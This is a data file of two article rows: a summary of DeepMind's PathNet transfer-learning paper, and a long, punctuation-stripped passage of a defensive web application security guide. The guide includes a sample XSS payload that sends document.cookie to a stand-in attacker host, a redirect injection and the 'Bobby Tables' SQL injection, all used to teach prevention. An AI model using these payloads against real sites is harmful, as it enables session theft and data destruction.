27,engineering,DeepMind just published a mind blowing paperPathNet is composed of layers of modules  Each module is a Neural Network of any type  it could be convolutional  recurrent  feedforward and whatnot   DeepMind is on the path of solving this with PathNet  PathNet is a network of neural networks  trained using both stochastic gradient descent and a genetic selection method   Since scientists started building and training neural networks  Transfer Learning has been the main bottleneck  Transfer Learning is the ability of an AI to learn from different tasks and apply its pre learned knowledge to a completely new task  It is implicit that with this precedent knowledge  the AI will perform better and train faster than de novo neural networks on the new task   Each of those nine boxes is the PathNet at a different iteration  In this case  PathNet was trained on two different games using a Advantage Actor critic or A3C  Although Pong and Alien seem very different at first  we observe a positive transfer learning using PathNet  take a look at the score graph    How does it train  First of all  we need to define the modules  Let L be the number of layers and N be the maximum number of modules per layer  the paper indicates that N is typically 3 or 4   The last layer is dense and not shared between the different tasks  Using A3c  this last layer represents the value function and policy evaluation   After defining those modules  P genotypes   pathways  are generated in the network  Due to the asynchronous nature of A3c  multiple workers are spawned to evaluate each genotype  After T episodes  a worker selects a couple of other pathways to compare to  if any of those pathways have a better fitness  it adopts it and continues training with that new pathway  If not  the worker continues evaluating the fitness of its pathway   Pathways are trained using stochastic gradient descent with back propagation throughout a single path at a time  This guarantees a manageable training time   Transfer learning  After learning a task  the network fixes all parameters on the optimal path  All other parameters must be reinitialized  otherwise PathNet will perform poorly on a new task   Using A3C  the optimal path of the previous task is not modified by the back propagation pass on the PathNet for a new task  This can be viewed as a safety net to not erase previous knowledge  Results
28,engineering,The Basics of Web Application SecurityModern web development has many challenges  and of those security is both very important and often under emphasized  While such techniques as threat analysis are increasingly recognized as essential to any serious development  there are also some basic practices which every developer can and should be doing as a matter of course   Daniel Somerfield is a Technical Lead at ThoughtWorks  where he works with customers building systems that serve their business needs and are fast  flexible  and secure  Daniel is an advocate for immutable infrastructure and cloud automation as a vehicle to advance the state of secure agile delivery at ThoughtWorks and in the industry at large   Cade Cairns is a software developer with a passion for security  He has experience leading teams creating everything from enterprise applications to security testing software  mobile applications  and software for embedded devices  At the moment his primary focus is on helping improve how security concerns are addressed during the solution delivery lifecycle   The modern software developer has to be something of a swiss army knife  Of course  you need to write code that fulfills customer functional requirements  It needs to be fast  Further you are expected to write this code to be comprehensible and extensible  sufficiently flexible to allow for the evolutionary nature of IT demands  but stable and reliable  You need to be able to lay out a useable interface  optimize a database  and often set up and maintain a delivery pipeline  You need to be able to get these things done by yesterday   Somewhere  way down at the bottom of the list of requirements  behind  fast  cheap  and flexible is  secure   That is  until something goes wrong  until the system you build is compromised  then suddenly security is  and always was  the most important thing   Security is a cross functional concern a bit like Performance  And a bit unlike Performance  Like Performance  our business owners often know they need Security  but aren t always sure how to quantify it  Unlike Performance  they often don t know  secure enough  when they see it   So how can a developer work in a world of vague security requirements and unknown threats  Advocating for defining those requirements and identifying those threats is a worthy exercise  but one that takes time and therefore money  Much of the time developers will operate in absence of specific security requirements and while their organization grapples with finding ways to introduce security concerns into the requirements intake processes  they will still build systems and write code   In this Evolving Publication  we will   point out common areas in a web application that developers need to be particularly conscious of security risks  provide guidance for how to address each risk on common web stacks  highlight common mistakes developers make  and how to avoid them  Security is a massive topic  even if we reduce the scope to only browser based web applications  These articles will be closer to a  best of  than a comprehensive catalog of everything you need to know  but we hope it will provide a directed first step for developers who are trying to ramp up fast   Trust Before jumping into the nuts and bolts of input and output  it s worth mentioning one of the most crucial underlying principles of security  trust  We have to ask ourselves  do we trust the integrity of request coming in from the user s browser   hint  we don t   Do we trust that upstream services have done the work to make our data clean and safe   hint  nope   Do we trust the connection between the user s browser and our application cannot be tampered   hint  not completely      Do we trust that the services and data stores we depend on   hint  we might     Of course  like security  trust is not binary  and we need to assess our risk tolerance  the criticality of our data  and how much we need to invest to feel comfortable with how we have managed our risk  In order to do that in a disciplined way  we probably need to go through threat and risk modeling processes  but that s a complicated topic to be addressed in another article  For now  suffice it to say that we will identify a series of risks to our system  and now that they are identified  we will have to address the threats that arise   Reject Unexpected Form Input HTML forms can create the illusion of controlling input  The form markup author might believe that because they are restricting the types of values that a user can enter in the form the data will conform to those restrictions  But rest assured  it is no more than an illusion  Even client side JavaScript form validation provides absolutely no value from a security perspective  Untrusted Input On our scale of trust  data coming from the user s browser  whether we are providing the form or not  and regardless of whether the connection is HTTPS protected  is effectively zero  The user could very easily modify the markup before sending it  or use a command line application like curl to submit unexpected data  Or a perfectly innocent user could be unwittingly submitting a modified version of a form from a hostile website  Same Origin Policy doesn t prevent a hostile site from submitting to your form handling endpoint  In order to ensure the integrity of incoming data  validation needs to be handled on the server  But why is malformed data a security concern  Depending on your application logic and use of output encoding  you are inviting the possibility of unexpected behavior  leaking data  and even providing an attacker with a way of breaking the boundaries of input data into executable code  For example  imagine that we have a form with a radio button that allows the user to select a communication preference  Our form handling code has application logic with different behavior depending on those values  final String communicationType   req getParameter  communicationType    if   email  equals communicationType     sendByEmail      else if   text  equals communicationType     sendByText      else   sendError resp  format  Can t send by type  s   communicationType      This code may or may not be dangerous  depending on how the sendError method is implemented  We are trusting that downstream logic processes untrusted content correctly  It might  But it might not  We re much better off if we can eliminate the possibility of unanticipated control flow entirely  So what can a developer do to minimize the danger that untrusted input will have undesirable effects in application code  Enter input validation  Input Validation Input validation is the process of ensuring input data is consistent with application expectations  Data that falls outside of an expected set of values can cause our application to yield unexpected results  for example violating business logic  triggering faults  and even allowing an attacker to take control of resources or the application itself  Input that is evaluated on the server as executable code  such as a database query  or executed on the client as HTML JavaScript is particularly dangerous  Validating input is an important first line of defense to protect against this risk  Developers often build applications with at least some basic input validation  for example to ensure a value is non null or an integer is positive  Thinking about how to further limit input to only logically acceptable values is the next step toward reducing risk of attack  Input validation is more effective for inputs that can be restricted to a small set  Numeric types can typically be restricted to values within a specific range  For example  it doesn t make sense for a user to request to transfer a negative amount of money or to add several thousand items to their shopping cart  This strategy of limiting input to known acceptable types is known as positive validation or whitelisting  A whitelist could restrict to a string of a specific form such as a URL or a date of the form  yyyy mm dd   It could limit input length  a single acceptable character encoding  or  for the example above  only values that are available in your form  Another way of thinking of input validation is that it is enforcement of the contract your form handling code has with its consumer  Anything violating that contract is invalid and therefore rejected  The more restrictive your contract  the more aggressively it is enforced  the less likely your application is to fall prey to security vulnerabilities that arise from unanticipated conditions  You are going to have to make a choice about exactly what to do when input fails validation  The most restrictive and  arguably most desirable is to reject it entirely  without feedback  and make sure the incident is noted through logging or monitoring  But why without feedback  Should we provide our user with information about why the data is invalid  It depends a bit on your contract  In form example above  if you receive any value other than  email  or  text   something funny is going on  you either have a bug or you are being attacked  Further  the feedback mechanism might provide the point of attack  Imagine the sendError method writes the text back to the screen as an error message like  We re unable to respond with communicationType    That s all fine if the communicationType is  carrier pigeon  but what happens if it looks like this   script new Image   src    http   evil martinfowler com steal     document cookie  script  You ve now faced with the possibility of a reflective XSS attack that steals session cookies  If you must provide user feedback  you are best served with a canned response that doesn t echo back untrusted user data  for example  You must choose email or text   If you really can t avoid rendering the user s input back at them  make absolutely sure it s properly encoded  see below for details on output encoding   In Practice It might be tempting to try filtering the  script  tag to thwart this attack  Rejecting input that contains known dangerous values is a strategy referred to as negative validation or blacklisting  The trouble with this approach is that the number of possible bad inputs is extremely large  Maintaining a complete list of potentially dangerous input would be a costly and time consuming endeavor  It would also need to be continually maintained  But sometimes it s your only option  for example in cases of free form input  If you must blacklist  be very careful to cover all your cases  write good tests  be as restrictive as you can  and reference OWASP s XSS Filter Evasion Cheat Sheet to learn common methods attackers will use to circumvent your protections  Resist the temptation to filter out invalid input  This is a practice commonly called  sanitization   It is essentially a blacklist that removes undesirable input rather than rejecting it  Like other blacklists  it is hard to get right and provides the attacker with more opportunities to evade it  For example  imagine  in the case above  you choose to filter out  script  tags  An attacker could bypass it with something as simple as   scr script ipt  Even though your blacklist caught the attack  by fixing it  you just reintroduced the vulnerability  Input validation functionality is built in to most modern frameworks and  when absent  can also be found in external libraries that enable the developer to put multiple constraints to be applied as rules on a per field basis  Built in validation of common patterns like email addresses and credit card numbers is a helpful bonus  Using your web framework s validation provides the additional advantage of pushing the validation logic to the very edge of the web tier  causing invalid data to be rejected before it ever reaches complex application code where critical mistakes are easier to make  Framework Approaches Java Hibernate  Bean Validation  ESAPI Spring Built in type safe params in Controller Built in Validator interface  Bean Validation  Ruby on Rails Built in Active Record Validators ASP NET Built in Validation  see BaseValidator  Play Built in Validator Generic JavaScript xss filters NodeJS validator js General Regex based validation on application inputs In Summary White list when you can  Black list when you can t whitelist  Keep your contract as restrictive as possible  Make sure you alert about the possible attack  Avoid reflecting input back to a user  Reject the web content before it gets deeper into application logic to minimize ways to mishandle untrusted data or  even better  use your web framework to whitelist input Although this section focused on using input validation as a mechanism for protecting your form handling code  any code that handles input from an untrusted source can be validated in much the same way  whether the message is JSON  XML  or any other format  and regardless of whether it s a cookie  a header  or URL parameter string  Remember  if you don t control it  you can t trust it  If it violates the contract  reject it   Encode HTML Output In addition to limiting data coming into an application  web application developers need to pay close attention to the data as it comes out  A modern web application usually has basic HTML markup for document structure  CSS for document style  JavaScript for application logic  and user generated content which can be any of these things  It s all text  And it s often all rendered to the same document  An HTML document is really a collection of nested execution contexts separated by tags  like  script  or  style    The developer is always one errant angle bracket away from running in a very different execution context than they intend  This is further complicated when you have additional context specific content embedded within an execution context  For example  both HTML and JavaScript can contain a URL  each with rules all their own  Output Risks HTML is a very  very permissive format  Browsers try their best to render the content  even if it is malformed  That may seem beneficial to the developer since a bad bracket doesn t just explode in an error  however  the rendering of badly formed markup is a major source of vulnerabilities  Attackers have the luxury of injecting content into your pages to break through execution contexts  without even having to worry about whether the page is valid  Handling output correctly isn t strictly a security concern  Applications rendering data from sources like databases and upstream services need to ensure that the content doesn t break the application  but risk becomes particularly high when rendering content from an untrusted source  As mentioned in the prior section  developers should be rejecting input that falls outside the bounds of the contract  but what do we do when we need to accept input containing characters that has the potential to change our code  like a single quote         or open bracket          This is where output encoding comes in  Output Encoding Output encoding is converting outgoing data to a final output format  The complication with output encoding is that you need a different codec depending on how the outgoing data is going to be consumed  Without appropriate output encoding  an application could provide its client with misformatted data making it unusable  or even worse  dangerous  An attacker who stumbles across insufficient or inappropriate encoding knows that they have a potential vulnerability that might allow them to fundamentally alter the structure of the output from the intent of the developer  For example  imagine that one of the first customers of a system is the former supreme court judge Sandra Day O Connor  What happens if her name is rendered into HTML   p The Honorable Justice Sandra Day O Connor  p  renders as  The Honorable Justice Sandra Day O Connor All is right with the world  The page is generated as we would expect  But this could be a fancy dynamic UI with a model view controller architecture  These strings are going to show up in JavaScript  too  What happens when the page outputs this to the browser  document getElementById  name   innerText    Sandra Day O Connor       unescaped string The result is malformed JavaScript  This is what hackers look for to break through execution context and turn innocent data into dangerous executable code  If the Chief Justice enters her name as Sandra Day O  window location  http   evil martinfowler com    suddenly our user has been pushed to a hostile site  If  however  we correctly encode the output for a JavaScript context  the text will look like this   Sandra Day O   window location   http   evil martinfowler com      A bit confusing  perhaps  but a perfectly harmless  non executable string  Note There are a couple strategies for encoding JavaScript  This particular encoding uses escape sequences to represent the apostrophe           but it could also be represented safely with the Unicode escape seqeence          The good news is that most modern web frameworks have mechanisms for rendering content safely and escaping reserved characters  The bad news is that most of these frameworks include a mechanism for circumventing this protection and developers often use them either due to ignorance or because they are relying on them to render executable code that they believe to be safe  Cautions and Caveats There are so many tools and frameworks these days  and so many encoding contexts  e g  HTML  XML  JavaScript  PDF  CSS  SQL  etc    that creating a comprehensive list is infeasible  however  below is a starter for what to use and avoid for encoding HTML in some common frameworks  If you are using another framework  check the documentation for safe output encoding functions  If the framework doesn t have them  consider changing frameworks to something that does  or you ll have the unenviable task of creating output encoding code on your own  Also note  that just because a framework renders HTML safely  doesn t mean it s going to render JavaScript or PDFs safely  You need to be aware of the encoding a particular context the encoding tool is written for  Be warned  you might be tempted to take the raw user input  and do the encoding before storing it  This pattern will generally bite you later on  If you were to encode the text as HTML prior to storage  you can run into problems if you need to render the data in another format  it can force you to unencode the HTML  and re encode into the new output format  This adds a great deal of complexity and encourages developers to write code in their application code to unescape the content  making all the tricky upstream output encoding effectively useless  You are much better off storing the data in its most raw form  then handling encoding at rendering time  Finally  it s worth noting that nested rendering contexts add an enormous amount of complexity and should be avoided whenever possible  It s hard enough to get a single output string right  but when you are rendering a URL  in HTML within JavaScript  you have three contexts to worry about for a single string  If you absolutely cannot avoid nested contexts  make sure to de compose the problem into separate stages  thoroughly test each one  paying special attention to order of rendering  OWASP provides some guidance for this situation in the DOM based XSS Prevention Cheat Sheet In Summary Output encode all application data on output with an appropriate codec  Use your framework s output encoding capability  if available  Avoid nested rendering contexts as much as possible  Store your data in raw form and encode at rendering time  Avoid unsafe framework and JavaScript calls that avoid encoding  Bind Parameters for Database Queries Whether you are writing SQL against a relational database  using an object relational mapping framework  or querying a NoSQL database  you probably need to worry about how input data is used within your queries  The database is often the most crucial part of any web application since it contains state that can t be easily restored  It can contain crucial and sensitive customer information that must be protected  It is the data that drives the application and runs the business  So you would expect developers to take the most care when interacting with their database  and yet injection into the database tier continues to plague the modern web application even though it s relatively easy to prevent  Little Bobby Tables No discussion of parameter binding would be complete without including the famous 2007  Little Bobby Tables  issue of xkcd  To decompose this comic  imagine the system responsible for keeping track of grades has a function for adding new students  void addStudent String lastName  String firstName    String query    INSERT INTO students  last_name  first_name  VALUES       lastName            firstName         getConnection   createStatement   execute query     If addStudent is called with parameters  Fowler    Martin   the resulting SQL is  INSERT INTO students  last_name  first_name  VALUES   Fowler    Martin   But with Little Bobby s name the following SQL is executed  INSERT INTO students  last_name  first_name  VALUES   XKCD    Robert    DROP TABLE Students       In fact  two commands are executed  INSERT INTO students  last_name  first_name  VALUES   XKCD    Robert   DROP TABLE Students The final      comments out the remainder of the original query  ensuring the SQL syntax is valid  Et voila  the DROP is executed  This attack vector allows the user to execute arbitrary SQL within the context of the application s database user  In other words  the attacker can do anything the application can do and more  which could result in attacks that cause greater harm than a DROP  including violating data integrity  exposing sensitive information or inserting executable code  Later we will talk about defining different users as a secondary defense against this kind of mistake  but for now  suffice to say that there is a very simple application level strategy for minimizing injection risk  Parameter Binding to the Rescue To quibble with Hacker Mom s solution  sanitizing is very difficult to get right  creates new potential attack vectors and is certainly not the right approach  Your best  and arguably only decent option is parameter binding  JDBC  for example  provides the PreparedStatement setXXX   methods for this very purpose  Parameter binding provides a means of separating executable code  such as SQL  from content  transparently handling content encoding and escaping  void addStudent String lastName  String firstName    PreparedStatement stmt   getConnection   prepareStatement  INSERT INTO students  last_name  first_name  VALUES           stmt setString 1  lastName   stmt setString 2  firstName   stmt execute      Any full featured data access layer will have the ability to bind variables and defer implementation to the underlying protocol  This way  the developer doesn t need to understand the complexities that arise from mixing user input with executable code  For this to be effective all untrusted inputs need to be bound  If SQL is built through concatenation  interpolation  or formatting methods  none of the resulting string should be created from user input  Clean and Safe Code Sometimes we encounter situations where there is tension between good security and clean code  Security sometimes requires the programmer to add some complexity in order to protect the application  In this case however  we have one of those fortuitous situations where good security and good design are aligned  In addition to protecting the application from injection  introducing bound parameters improves comprehensibility by providing clear boundaries between code and content  and simplifies creating valid SQL by eliminating the need to manage the quotes by hand  As you introduce parameter binding to replace your string formatting or concatenation  you may also find opportunities to introduce generalized binding functions to the code  further enhancing code cleanliness and security  This highlights another place where good design and good security overlap  de duplication leads to additional testability  and reduction of complexity  Common Misconceptions There is a misconception that stored procedures prevent SQL injection  but that is only true insofar as parameters are bound inside the stored procedure  If the stored procedure itself does string concatenation it can be injectable as well  and binding the variable from the client won t save you  Similarly  object relational mapping frameworks like ActiveRecord  Hibernate  or  NET Entity Framework  won t protect you unless you are using binding functions  If you are building your queries using untrusted input without binding  the app still could be vulnerable to an injection attack  For more detail on the injection risks of stored procedures and ORMs  see security analyst Troy Hunt s article Stored procedures and ORMs won t save you from SQL injection   Finally  there is a misconception that NoSQL databases are not susceptible to injection attack and that is not true  All query languages  SQL or otherwise  require a clear separation between executable code and content so the execution doesn t confuse the command from the parameter  Attackers look for points in the runtime where they can break through those boundaries and use input data to change the intended execution path  Even Mongo DB  which uses a binary wire protocol and language specific API  reducing opportunities for text based injection attacks  exposes the   where  operator which is vulnerable to injection  as is demonstrated in this article from the OWASP Testing Guide  The bottom line is that you need to check the data store and driver documentation for safe ways to handle input data  Parameter Binding Functions Check the matrix below for indication of safe binding functions of your chosen data store  If it is not included in this list  check the product documentation  Framework Encoded Dangerous Raw JDBC Connection prepareStatement   used with setXXX   methods and bound parameters for all input  Any query or update method called with string concatenation rather than binding  PHP   MySQLi prepare   used with bind_param for all input  Any query or update method called with string concatenation rather than binding  MongoDB Basic CRUD operations such as find    insert    with BSON document field names controlled by application  Operations  including find  when field names are allowed to be determined by untrusted data or use of Mongo operations such as   where  that allow arbitrary JavaScript conditions  Cassandra Session prepare used with BoundStatement and bound parameters for all input  Any query or update method called with string concatenation rather than binding  Hibernate   JPA Use SQL or JPQL OQL with bound parameters via setParameter Any query or update method called with string concatenation rather than binding  ActiveRecord Condition functions  find_by  where  if used with hashes or bound parameters  eg  where  foo  bar  where   foo       bar  Condition functions used with string concatenation or interpolation  where  foo      bar     where  foo        bar        In Summary Avoid building SQL  or NoSQL equivalent  from user input  Bind all parameterized data  both queries and stored procedures  Use the native driver binding function rather than trying to handle the encoding yourself  Don t think stored procedures or ORM tools will save you  You need to use binding functions for those  too  NoSQL doesn t make you injection proof  Protect Data in Transit While we re on the subject of input and output  there s another important consideration  the privacy and integrity of data in transit  When using an ordinary HTTP connection  users are exposed to many risks arising from the fact data is transmitted in plaintext  An attacker capable of intercepting network traffic anywhere between a user s browser and a server can eavesdrop or even tamper with the data completely undetected in a man in the middle attack  There is no limit to what the attacker can do  including stealing the user s session or their personal information  injecting malicious code that will be executed by the browser in the context of the website  or altering data the user is sending to the server  We can t usually control the network our users choose to use  They very well might be using a network where anyone can easily watch their traffic  such as an open wireless network in a caf  or on an airplane  They might have unsuspectingly connected to a hostile wireless network with a name like  Free Wi Fi  set up by an attacker in a public place  They might be using an internet provider that injects content such as ads into their web traffic  or they might even be in a country where the government routinely surveils its citizens  If an attacker can eavesdrop on a user or tamper with web traffic  all bets are off  The data exchanged cannot be trusted by either side  Fortunately for us  we can protect against many of these risks with HTTPS  HTTPS and Transport Layer Security HTTPS was originally used mainly to secure sensitive web traffic such as financial transactions  but it is now common to see it used by default on many sites we use in our day to day lives such as social networking and search engines  The HTTPS protocol uses the Transport Layer Security  TLS  protocol  the successor to the Secure Sockets Layer  SSL  protocol  to secure communications  When configured and used correctly  it provides protection against eavesdropping and tampering  along with a reasonable guarantee that a website is the one we intend to be using  Or  in more technical terms  it provides confidentiality and data integrity  along with authentication of the website s identity  With the many risks we all face  it increasingly makes sense to treat all network traffic as sensitive and encrypt it  When dealing with web traffic  this is done using HTTPS  Several browser makers have announced their intent to deprecate non secure HTTP and even display visual indications to users to warn them when a site is not using HTTPS  Most HTTP 2 implementations in browsers will only support communicating over TLS  So why aren t we using it for everything now  There have been some hurdles that impeded adoption of HTTPS  For a long time  it was perceived as being too computationally expensive to use for all traffic  but with modern hardware that has not been the case for some time  The SSL protocol and early versions of the TLS protocol only support the use of one web site certificate per IP address  but that restriction was lifted in TLS with the introduction of a protocol extension called SNI  Server Name Indication   which is now supported in most browsers  The cost of obtaining a certificate from a certificate authority also deterred adoption  but the introduction of free services like Let s Encrypt has eliminated that barrier  Today there are fewer hurdles than ever before  Get a Server Certificate The ability to authenticate the identity of a website underpins the security of TLS  In the absence of the ability to verify that a site is who it says it is  an attacker capable of doing a man in the middle attack could impersonate the site and undermine any other protection the protocol provides  When using TLS  a site proves its identity using a public key certificate  This certificate contains information about the site along with a public key that is used to prove that the site is the owner of the certificate  which it does using a corresponding private key that only it knows  In some systems a client may also be required to use a certificate to prove its identity  although this is relatively rare in practice today due to complexities in managing certificates for clients  Unless the certificate for a site is known in advance  a client needs some way to verify that the certificate can be trusted  This is done based on a model of trust  In web browsers and many other applications  a trusted third party called a Certificate Authority  CA  is relied upon to verify the identity of a site and sometimes of the organization that owns it  then grant a signed certificate to the site to certify it has been verified  It isn t always necessary to involve a trusted third party if the certificate is known in advance by sharing it through some other channel  For example  a mobile app or other application might be distributed with a certificate or information about a custom CA that will be used to verify the identity of the site  This practice is referred to as certificate or public key pinning and is outside the scope of this article  The most visible indicator of security that many web browsers display is when communications with a site are secured using HTTPS and the certificate is trusted  Without it  a browser will display a warning about the certificate and prevent a user from viewing your site  so it is important to get a certificate from a trusted CA  It is possible to generate your own certificate to test a HTTPS configuration out  but you will need a certificate signed by a trusted CA before exposing the service to users  For many uses  a free CA is a good starting point  When searching for a CA  you will encounter different levels of certification offered  The most basic  Domain Validation  DV   certifies the owner of the certificate controls a domain  More costly options are Organization Validation  OV  and Extended Validation  EV   which involve the CA doing additional checks to verify the organization requesting the certificate  Although the more advanced options result in a more positive visual indicator of security in the browser  it may not be worth the extra cost for many  Configure Your Server With a certificate in hand  you can begin to configure your server to support HTTPS  At first glance  this may seem like a task worthy of someone who holds a PhD in cryptography  You may want to choose a configuration that supports a wide range of browser versions  but you need to balance that with providing a high level of security and maintaining some level of performance  The cryptographic algorithms and protocol versions supported by a site have a strong impact on the level of communications security it provides  Attacks with impressive sounding names like FREAK and DROWN and POODLE  admittedly  the last one doesn t sound all that formidable  have shown us that supporting dated protocol versions and algorithms presents a risk of browsers being tricked into using the weakest option supported by a server  making attack much easier  Advancements in computing power and our understanding of the mathematics underlying algorithms also renders them less safe over time  How can we balance staying up to date with making sure our website remains compatible for a broad assortment of users who might be using dated browsers that only support older protocol versions and algorithms  Fortunately  there are tools that help make the job of selection a lot easier  Mozilla has a helpful SSL Configuration Generator to generate recommended configurations for various web servers  along with a complementary Server Side TLS Guide with more in depth details  Note that the configuration generator mentioned above enables a browser security feature called HSTS by default  which might cause problems until you re ready to commit to using HTTPS for all communications long term  We ll discuss HSTS a little later in this article  Use HTTPS for Everything It is not uncommon to encounter a website where HTTPS is used to protect only some of the resources it serves  In some cases the protection might only be extended to handling form submissions that are considered sensitive  Other times  it might only be used for resources that are considered sensitive  for example what a user might access after logging into the site  The trouble with this inconsistent approach is that anything that isn t served over HTTPS remains susceptible to the kinds of risks that were outlined earlier  For example  an attacker doing a man in the middle attack could simply alter the form mentioned above to submit sensitive data over plaintext HTTP instead  If the attacker injects executable code that will be executed in the context of our site  it isn t going to matter much that part of it is protected with HTTPS  The only way to prevent those risks is to use HTTPS for everything  The solution isn t quite as clean cut as flipping a switch and serving all resources over HTTPS  Web browsers default to using HTTP when a user enters an address into their address bar without typing  https     explicitly  As a result  simply shutting down the HTTP network port is rarely an option  Websites instead conventionally redirect requests received over HTTP to use HTTPS  which is perhaps not an ideal solution  but often the best one available  For resources that will be accessed by web browsers  adopting a policy of redirecting all HTTP requests to those resources is the first step towards using HTTPS consistently  For example  in Apache redirecting all requests to a path  in the example   content and anything beneath it  can be enabled with a few simple lines    Redirect requests to  content to use HTTPS  mod_rewrite is required  RewriteEngine On RewriteCond   HTTPS     on  NC  RewriteCond   REQUEST_URI    content       RewriteRule   https     SERVER_NAME   REQUEST_URI   R L  If your site also serves APIs over HTTP  moving to using HTTPS can require a more measured approach  Not all API clients are able to handle redirects  In this situation it is advisable to work with consumers of the API to switch to using HTTPS and to plan a cutoff date  then begin responding to HTTP requests with an error after the date is reached  Use HSTS Redirecting users from HTTP to HTTPS presents the same risks as any other request sent over ordinary HTTP  To help address this challenge  modern browsers support a powerful security feature called HSTS  HTTP Strict Transport Security   which allows a website to request that a browser only interact with it over HTTPS  It was first proposed in 2009 in response to Moxie Marlinspike s famous SSL stripping attacks  which demonstrated the dangers of serving content over HTTP  Enabling it is as simple as sending a header in a response  Strict Transport Security  max age 15768000 The above header instructs the browser to only interact with the site using HTTPS for a period of six months  specified in seconds   HSTS is an important feature to enable due to the strict policy it enforces  Once enabled  the browser will automatically convert any insecure HTTP requests to use HTTPS instead  even if a mistake is made or the user explicitly types  http     into their address bar  It also instructs the browser to disallow the user from bypassing the warning it displays if an invalid certificate is encountered when loading the site  In addition to requiring little effort to enable in the browser  enabling HSTS on the server side can require as little as a single line of configuration  For example  in Apache it is enabled by adding a Header directive within the VirtualHost configuration for port 443   VirtualHost   443        HSTS  mod_headers is required   15768000 seconds   6 months  Header always set Strict Transport Security  max age 15768000    VirtualHost  Now that you have an understanding of some of the risks inherent to ordinary HTTP  you might be scratching your head wondering what happens when the first request to a website is made over HTTP before HSTS can be enabled  To address this risk some browsers allow websites to be added to a  HSTS Preload List  that is included with the browsers  Once included in this list it will no longer be possible for the website to be accessed using HTTP  even on the first time a browser is interacting with the site  Before deciding to enable HSTS  some potential challenges must first be considered  Most browsers will refuse to load HTTP content referenced from a HTTPS resource  so it is important to update existing resources and verify all resources can be accessed using HTTPS  We don t always have control over how content can be loaded from external systems  for example from an ad network  This might require us to work with the owner of the external system to adopt HTTPS  or it might even involve temporarily setting up a proxy to serve the external content to our users over HTTPS until the external systems are updated  Once HSTS is enabled  it cannot be disabled until the period specified in the header elapses  It is advisable to make sure HTTPS is working for all content before enabling it for your site  Removing a domain from the HSTS Preload List will take even longer  The decision to add your website to the Preload List is not one that should be taken lightly  Unfortunately  not all browsers in use today support HSTS  It can not yet be counted on as a guaranteed way to enforce a strict policy for all users  so it is important to continue to redirect users from HTTP to HTTPS and employ the other protections mentioned in this article  For details on browser support for HSTS  you can visit Can I use  Protect Cookies Browsers have a built in security feature to help avoid disclosure of a cookie containing sensitive information  Setting the  secure  flag in a cookie will instruct a browser to only send a cookie when using HTTPS  This is an important safeguard to make use of even when HSTS is enabled  Other Risks There are some other risks to be mindful of that can result in accidental disclosure of sensitive information despite using HTTPS  It is dangerous to put sensitive data inside of a URL  Doing so presents a risk if the URL is cached in browser history  not to mention if it is recorded in logs on the server side  In addition  if the resource at the URL contains a link to an external site and the user clicks through  the sensitive data will be disclosed in the Referer header  In addition  sensitive data might still be cached in the client  or by intermediate proxies if the client s browser is configured to use them and allow them to inspect HTTPS traffic  For ordinary users the contents of traffic will not be visible to a proxy  but a practice we ve seen often for enterprises is to install a custom CA on their employees  systems so their threat mitigation and compliance systems can monitor traffic  Consider using headers to disable caching to reduce the risk of leaking data due to caching  For a general list of best practices  the OWASP Transport Protection Layer Cheat Sheet contains some valuable tips  Verify Your Configuration As a last step  you should verify your configuration  There is a helpful online tool for that  too  You can visit SSL Labs  SSL Server Test to perform a deep analysis of your configuration and verify that nothing is misconfigured  Since the tool is updated as new attacks are discovered and protocol updates are made  it is a good idea to run this every few months  In Summary Use HTTPS for everything   Use HSTS to enforce it  You will need a certificate from a trusted certificate authority if you plan to trust normal web browsers  Protect your private key  Use a configuration tool to help adopt a secure HTTPS configuration  Set the  secure  flag in cookies  Be mindful not to leak sensitive data in URLs  Verify your server configuration after enabling HTTPS and every few months thereafter  Hash and Salt Your Users  Passwords When developing applications  you need to do more than protect your assets from attackers  You often need to protect your users from attackers  and even from themselves  Living Dangerously The most obvious way to write password authentication is to store username and password in table and do look ups against it  Don t ever do this     SQL CREATE TABLE application_user   email_address VARCHAR 100  NOT NULL PRIMARY KEY  password VARCHAR 100  NOT NULL     python def login conn  email  password   result   conn cursor   execute   SELECT   FROM application_user WHERE email_address     AND password        email  password   return result fetchone   is not None Does this work  Will it allow valid users in and keep unregistered users out  Yes  But here s why it s a very  very bad idea  The Risks Insecure password storage creates risks from both insiders and outsiders  In the former case  an insider such as an application developer or DBA who can read the above application_user table now has access to the credentials of your entire user base  One often overlooked risk is that your insiders can now impersonate your users within your application  Even if that particular scenario isn t of great concern  storing your users  credentials without appropriate cryptographic protection introduces an entirely new class of attack vectors for your user  completely unrelated to your application  We might hope it s otherwise  but the fact is that users reuse credentials  The first time someone signs up for your site of captioned cat pictures using the same email address and password that they use for their bank login  your seemingly low risk credentials database has become a vehicle for storing financial credentials  If a rogue employee or an external hacker steals your credentials data  they can use them for attempted logins to major bank sites until they find the one person who made the mistake of using their credentials with wackycatcaptions org  and one of your user s accounts is drained of funds and you are  at least in part  responsible  That leaves two choices  either store credentials safely or don t store them at all  I Can Hash Passwordz If you went down the path of creating logins for your site  option two is probably not available to you  so you are probably stuck with option one  So what is involved in safely storing credentials  Firstly  you never want to store the password itself  but rather store a hash of the password  A cryptographic hashing algorithm is a one way transformation from an input to an output from which the original input is  for all practical purposes  impossible to recover  More on that  practical purposes  phrase shortly  For example  your password might be  littlegreenjedi   Applying Argon2 with the salt  12345678   more on salts later  and default command line options  gives you the the hex result 9b83665561e7ddf91b7fd0d4873894bbd5afd4ac58ca397826e11d5fb02082a1   Now you aren t storing the password at all  but rather this hash  In order to validate a user s password  you just apply the same hash algorithm to the password text they send  and  if they match  you know the password is valid  So we re done  right  Well  not exactly  The problem now is that  assuming we don t vary the salt  every user with the password  littlegreenjedi  will have the same hash in our database  Many people just re use their same old password  Lookup tables generated using the most commonly occurring passwords and their variations can be used to efficiently reverse engineer hashed passwords  If an attacker gets hold of your password store  they can simply cross reference a lookup table with your password hashes and are statistically likely to extract a lot of credentials in a pretty short period of time  The trick is to add a bit of unpredictability into the password hashes so they cannot be easily reverse engineered  A salt  when properly generated  can provide just that  A Dash of Salt A salt is some extra data that is added to the password before it is hashed so that two instances of a given password do not have the same hash value  The real benefit here is that it increases the range of possible hashes of a given password beyond the point where it is practical to pre compute them  Suddenly the hash of  littlegreenjedi  can t be predicted anymore  If we use the salt the string  BNY0LGUZWWIZ3BVP  and then hash with Argon2 again  we get 67ddb83d85dc6f91b2e70878f333528d86674ecba1ae1c7aa5a94c7b4c6b2c52   On the other hand  if we use  M3WIBNKBYVSJW4ZJ   we get 64e7d42fb1a19bcf0dc8a3533dd3766ba2d87fd7ab75eb7acb6c737593cef14e   Now  if an attacker gets their hands on the password hash store  it is much more expensive to brute force the passwords  The salt doesn t require any special protection 